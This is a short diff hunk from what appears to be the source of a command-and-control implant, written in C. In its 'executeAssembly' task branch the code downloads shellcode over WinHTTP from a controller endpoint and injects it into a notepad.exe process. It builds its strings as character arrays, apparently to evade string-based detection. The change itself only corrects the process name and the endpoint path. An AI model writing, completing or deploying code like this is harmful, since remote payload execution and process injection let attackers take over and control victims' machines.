@@ -404,9 +404,9 @@ void myMain()
         }
         else if (my_strcmp(taskType, executeAssembly) == 0)
         {
-            CHAR lpApplicationName[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', 0 };
+            CHAR lpApplicationName[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
             DWORD dwShellcodeSize;
-            WCHAR cAssemblyEndpoint[] = { 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
+            WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
             LPVOID shellcode = winHTTPClient(api, &dwShellcodeSize, cAssemblyEndpoint);
             ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, lpApplicationName);
             CHAR taskOutput[] = { 'E', 'x', 'e', 'c', 'u', 't', 'e', ' ', 'A', 's', 'm', ' ', 'S', 'u', 'c', 'c', 'e', 's', 's', 0 };
